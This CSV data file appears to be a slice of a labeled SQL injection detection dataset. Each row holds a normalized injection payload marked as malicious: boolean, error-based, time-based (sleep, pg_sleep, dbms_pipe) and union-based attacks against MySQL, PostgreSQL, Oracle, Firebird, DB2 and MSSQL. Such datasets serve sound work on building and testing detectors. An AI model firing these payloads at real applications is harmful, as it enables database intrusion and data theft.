row_index,payload_norm,label,sqli_type_hint
9300,"1"" ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""prtf"" like ""prtf",1,
9301,"1 ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 8965 = 8965",1,
9302,"1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1,
9303,"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1,
9304,"1%' ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
9305,"-1031%"" union all select 6832,6832,6832,6832#",1,
9306,"-9740"" ) ) as pxkx where 5305 = 5305 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
9307,"1"" ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ""ejpw"" = ""ejpw",1,
9308,( select ( case when ( 6714 = 8872 ) then 1 else 6714* ( select 6714 from master..sysdatabases ) end ) ),1,
9309,"-1084' ) union all select 2634,2634,2634,2634,2634,2634,2634,2634#",1,
9310,"select * from generate_series ( 1431,1431,case when ( 1431 = 7822 ) then 1 else 0 end ) limit 1--",1,
9311,-5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,
9312,"1%' and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
9313,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",1,
9314,"1"" ) ) rlike sleep ( 5 ) #",1,
9315,"1"" ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ""ladc"" like ""ladc",1,
9316,"1"" ) as hfgk where 1100 = 1100 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
9317,"1%"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ""%"" = """,1,
9318,1'|| ( select 'bezt' where 7876 = 7876,1,
9319,"1' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1,
9320,1 ) as nioj where 9703 = 9703,1,
9321,"1"" ) ) ) and ( 7396 = 6351 ) *6351 and ( ( ( ""xerw"" like ""xerw",1,
9322,"1' ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'qtni' = 'qtni",1,
9323,-7387' ) ) ) order by 1--,1,
9324,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 'aatp' = 'aatp",1,
9325,"1%"" and elt ( 1210 = 1210,sleep ( 5 ) ) and ""%"" = """,1,
9326,"1' ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'viad' like 'viad",1,
9327,"1 ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
9328,( select * from ( select ( sleep ( 5 ) ) ) lrov ),1,
9329,"1"" ) as ltbl where 6395 = 6395",1,
